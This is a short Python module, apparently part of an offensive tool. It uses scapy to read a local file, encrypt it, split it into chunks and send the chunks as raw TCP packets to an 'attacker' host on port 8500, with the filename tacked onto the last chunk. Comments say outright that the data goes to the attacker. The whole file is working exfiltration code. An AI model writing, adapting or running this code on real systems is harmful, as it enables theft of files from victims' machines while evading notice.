from scapy.all import *
import encryption as encryption


hostaddr = ""


def get_file(filepath, host_ip):
    # Set attacker address first
    global hostaddr
    host_addr = host_ip

    with open(filepath, "rb") as file:
        data = file.read()

    encrypted_data = encryption.encrypt_data(data)
    encrypted_data = encrypted_data.decode("utf-8")

    # Get file name from path
    temp = filepath.split("/")
    filename = temp[-1]

    # Send to attacker
    chunks = [encrypted_data[i:i+1000] for i in range(0, len(encrypted_data), 1000)]
    chunks[-1] += ("$EOF" + filename)

    for chunk in chunks:
        pkt = IP(dst=host_addr)/TCP(sport=RandShort(), dport=8500)/chunk.encode("utf-8")
        send(pkt, verbose=False)
        time.sleep(1)
